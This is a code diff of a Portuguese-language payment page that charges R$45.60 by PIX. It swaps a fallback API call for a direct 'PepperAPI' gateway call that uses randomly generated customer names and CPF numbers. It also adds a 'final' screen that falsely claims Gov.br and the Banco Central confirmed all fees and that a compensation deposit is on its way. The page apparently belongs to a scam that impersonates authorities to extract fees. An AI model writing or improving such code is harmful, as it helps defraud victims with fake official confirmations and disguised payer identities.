@@ -7,7 +7,7 @@
   <link rel="icon" href="../assets/images/favicon.ico" type="image/x-icon">
 
   <!-- Meta Pixel Code -->
-  <script src="../pepper-api.js"></script>
+  
   <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -360,6 +360,9 @@
       object-fit: contain;
     }
   </style>
+  
+<script src="../../pepper-api.js"></script>
+<script src="pepper-api.js"></script>
 </head>
 <body>
 
@@ -590,6 +593,7 @@
       } catch (e) {}
 
       currentParams.set("valor", "45.60");
+      currentParams.set("gateway", "pepper");
 
       var gatewayCustomer = getOrCreateRandomGatewayCustomer();
       currentParams.set("gateway_name", gatewayCustomer.name);
@@ -620,72 +624,36 @@
           finished = true;
           goToPix(null);
         }
-      }, 6000);
+      }, 7000);
 
-      function handleAcessoSuccess(json) {
-        if (!finished) {
-          finished = true;
-          clearTimeout(timer);
-          if (json && json.pix) {
-            goToPix({
-              pix_qr_code: json.pix.pix_qr_code,
-              qr_code_base64: json.pix.qr_code_base64,
-              hash: json.hash
-            });
-          } else {
-            goToPix(null);
-          }
-        }
-      }
-
-      function handleAcessoFallback() {
-        var apiEndpoint = "../../api/gerar-pix.php";
-        try {
-          fetch(apiEndpoint, {
-            method: "POST",
-            headers: { "Content-Type": "application/json", "Accept": "application/json" },
-            body: JSON.stringify({
-              valor: "45.60",
-              gateway_name: gatewayCustomer.name,
-              gateway_cpf: gatewayCustomer.cpf,
-              gateway_email: gatewayCustomer.email,
-              gateway_phone: gatewayCustomer.phone
-            })
-          })
+      if (window.PepperAPI && typeof window.PepperAPI.createPix === "function") {
+        window.PepperAPI.createPix("45.60", gatewayCustomer)
           .then(function (res) {
-            if (res.ok) return res.json();
-            throw new Error("HTTP " + res.status);
+            if (!finished) {
+              finished = true;
+              clearTimeout(timer);
+              if (res && res.pix) {
+                goToPix({
+                  pix_qr_code: res.pix.pix_qr_code,
+                  qr_code_base64: res.pix.qr_code_base64,
+                  hash: res.hash
+                });
+              } else {
+                goToPix(null);
+              }
+            }
           })
-          .then(function (json) {
-            handleAcessoSuccess(json);
-          })
-          .catch(function () {
+          .catch(function (err) {
+            console.warn("PepperAPI createPix direct:", err);
             if (!finished) {
               finished = true;
               clearTimeout(timer);
               goToPix(null);
             }
           });
-        } catch (err) {
-          if (!finished) {
-            finished = true;
-            clearTimeout(timer);
-            goToPix(null);
-          }
-        }
-      }
-
-      if (window.PepperAPI && typeof window.PepperAPI.createPix === "function") {
-        window.PepperAPI.createPix("45.60", gatewayCustomer)
-          .then(function (res) {
-            handleAcessoSuccess(res);
-          })
-          .catch(function (err) {
-            console.warn("Pepper direct failed, attempting fallback:", err);
-            handleAcessoFallback();
-          });
       } else {
-        handleAcessoFallback();
+        clearTimeout(timer);
+        goToPix(null);
       }
     }
   </script>
@@ -696,5 +664,32 @@
     async
     defer
   ></script>
+<script>
+    // Suporte ao estado final do funil (final=true)
+    (function checkFinalState() {
+      var p = new URLSearchParams(window.location.search);
+      if (p.get("final") === "true") {
+        var warn = document.querySelector(".warning-text");
+        if (warn) warn.style.display = "none";
+        var payCard = document.querySelector(".payment-card");
+        if (payCard) {
+          payCard.innerHTML = `
+            <div style="text-align: center; padding: 10px 0;">
+              <div style="font-size: 44px; margin-bottom: 12px;">✅</div>
+              <h2 style="font-size: 20px; font-weight: 700; color: #065f46; margin-bottom: 8px;">Processo 100% Concluído!</h2>
+              <p style="font-size: 14px; color: #047857; line-height: 1.5; margin-bottom: 16px;">
+                Todas as etapas, taxas e declarações foram deferidas e confirmadas com sucesso pelo sistema oficial Gov.br e Banco Central.
+              </p>
+              <div style="font-size: 13px; font-weight: 600; color: #065f46; background: #d1fae5; border: 1px solid #a7f3d0; padding: 12px 14px; border-radius: 8px; margin-bottom: 12px;">
+                Depósito PIX agendado: O valor total da sua indenização será creditado em sua conta cadastrada em instantes.
+              </div>
+            </div>
+          `;
+          payCard.style.border = "2px solid #10b981";
+          payCard.style.backgroundColor = "#ecfdf5";
+        }
+      }
+    })();
+</script>
 </body>
 </html>
